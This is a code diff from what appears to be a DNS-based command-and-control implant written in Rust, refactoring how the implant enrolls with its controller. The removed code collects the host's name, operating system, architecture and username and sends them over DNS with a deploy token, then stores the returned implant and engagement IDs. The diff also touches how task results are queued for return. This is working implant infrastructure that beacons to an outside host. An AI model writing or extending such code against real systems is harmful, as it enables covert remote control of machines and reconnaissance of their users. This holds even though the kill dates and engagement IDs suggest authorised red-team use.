@@ -117,24 +117,7 @@ pub fn enroll_over_dns(
         build_exchange(scheme, &resolver, profile).map_err(|e| format!("enroll transport: {e}"))?;
     let sealed = sealed_key(profile);
 
-    let request = crate::wire::EnrollRequest {
-        deploy_token_secret: profile.token.clone(),
-        class: String::new(),
-        public_key: keys.public_spki_der(),
-        parent_implant_id: String::new(),
-        hostname: std::fs::read_to_string("/etc/hostname")
-            .ok()
-            .map(|h| h.trim().to_string())
-            .filter(|h| !h.is_empty())
-            .unwrap_or_else(|| "unknown".into()),
-        os: std::env::consts::OS.to_string(),
-        arch: std::env::consts::ARCH.to_string(),
-        username: std::env::var(if cfg!(windows) { "USERNAME" } else { "USER" })
-            .unwrap_or_default(),
-        kill_date: profile.kill_date.clone().unwrap_or_default(),
-        sleep_seconds: Some(profile.sleep_seconds),
-        jitter_seconds: Some(profile.jitter_seconds),
-    };
+    let request = crate::enroll::wire_enroll_request(profile, keys);
     let frames = crate::wire::encode(&[Frame {
         payload: request.encode_to_vec(),
         kind: FrameKind::EnrollRequest as i32,
@@ -235,19 +218,7 @@ pub fn enroll_over_dns(
         .find(|frame| frame.kind() == FrameKind::EnrollResponse)
         .and_then(|frame| crate::wire::EnrollResponse::decode(frame.payload.as_ref()).ok())
         .ok_or_else(|| "enroll answer carried no EnrollResponse frame".to_string())?;
-    if answer.status != crate::wire::rod::EnrollStatus::Ok as i32 {
-        return Err(format!("enroll rejected: status {}", answer.status));
-    }
-    let ca_chain = answer
-        .ca_chain
-        .iter()
-        .filter_map(|der| crate::trust::parse_der(der))
-        .collect();
-    Ok(crate::enroll::Enrollment {
-        implant_id: answer.implant_id,
-        engagement_id: answer.engagement_id,
-        ca_chain,
-    })
+    crate::enroll::enrollment_from_response(answer)
 }
 
 impl Dns {
@@ -306,7 +277,8 @@ impl Dns {
                             self.enqueue(
                                 &result.task_id,
                                 PendingKind::Result {
-                                    succeeded: result.outcome == 1,
+                                    succeeded: result.outcome
+                                        == crate::wire::rod::TaskOutcome::Succeeded as i32,
                                 },
                                 blob,
                             );
